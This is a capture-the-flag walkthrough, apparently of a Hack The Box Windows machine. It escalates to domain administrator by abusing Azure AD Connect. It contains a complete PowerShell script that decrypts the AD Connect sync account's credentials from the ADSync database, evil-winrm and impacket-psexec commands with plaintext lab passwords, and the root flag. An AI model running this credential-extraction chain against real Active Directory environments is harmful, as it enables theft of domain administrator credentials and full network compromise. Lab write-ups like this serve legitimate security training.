
We previously enumerated AD Sync being active as an Application, but also an SQL Database called "ADSync" in which we got an encoded password string for the Administrator user.

1. Checking out C:\Program Files

Provides us with the information that "AD Connect" is running. 

2. Let's find out the version of AD Connect

According to the Microsoft documentation, the name of the service responsible for syncing the local AD to Azure AD is ADSync . We don't see a reference to this on running Get-Process , and attempting to run tasklist results in an Access Denied error. We can also try to enumerate services with the PowerShell cmdlet Get-Service , or by invoking wmic.exe service get name , sc.exe query state= all or net.exe start , but are also denied access. Instead, we can enumerate the service instance using the Registry.

```
Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync
```

This reveals that the service binary is C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe (in ImagePath)
We can issue the command below to obtain the file (and product) version

```
Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" | Format-list -Property * -Force
```

Searching online reveals the adconnectdump tool: https://github.com/dirkjanm/adconnectdump, that can be used to extract the password for the AD Connect Sync Account. The repo mentions that the way that AD connect stores credentials changed a while back. The new version stores credentials using DPAPI and the old version used the Registry. The current version of AD Connect at the time of writing is 1.5.30.0 , so the version on the server is unlikely to use DPAPI. This tool works for newer versions of the AD Connect that use DPAPI. Some further searching reveals this blog post: https://blog.xpnsec.com/azuread-connect-for-redteam/, which is recommended reading. It details the exploitation process for the older version of AD Connect. Copy the script from the blog post and save it locally.

I modified the script accordingly, the original one uses a local database on the client variable and saved it locally as "adconnect.ps1".

```
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

Attempting to run this was successful. A default installation of AD Connect uses a SQL Server Express instance as a LocalDB, connecting over a named pipe.

The -s flag in Evil-WinRM allows us to specify a folder containing our malicious powershell script. We can load a script in memory within the Evil-WinRM session by typing the script name and hitting return.

```
evil-winrm -i 10.10.10.172 -u mhope -p "4n0therD4y@n0th3r$" -s /opt/tools
```

This was successful, and we have obtained credentials for the AD Connect Sync account. In this case, as it was a custom install, it seems the primary domain administrator was used for this. It's worth noting that a default installation uses the NT SERVICE\ADSync service account.

Let's use Evil WinRM to connect as the administrator.

In my evil-winrm session I called the script:

```
adconnect.ps1
```

Executed the following commands and gained credentials of the Administrator User!

```
*Evil-WinRM* PS C:\Users\mhope\Documents> Write-Host ("Domain: " + $domain.Domain)
Domain: MEGABANK.LOCAL
*Evil-WinRM* PS C:\Users\mhope\Documents> Write-Host ("Username: " + $username.Username)
Username: administrator
*Evil-WinRM* PS C:\Users\mhope\Documents> Write-Host ("Password: " + $password.Password)
Password: d0m@in4dminyeah!
```

```
administrator:d0m@in4dminyeah!
```

Connected via psexec to the Domain Controller and gained SYSTEM Shell.

```
impacket-psexec Administrator:'d0m@in4dminyeah!'@megabank.local
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
5b537e55d7d6061a180db0cd6a4c6ec7
```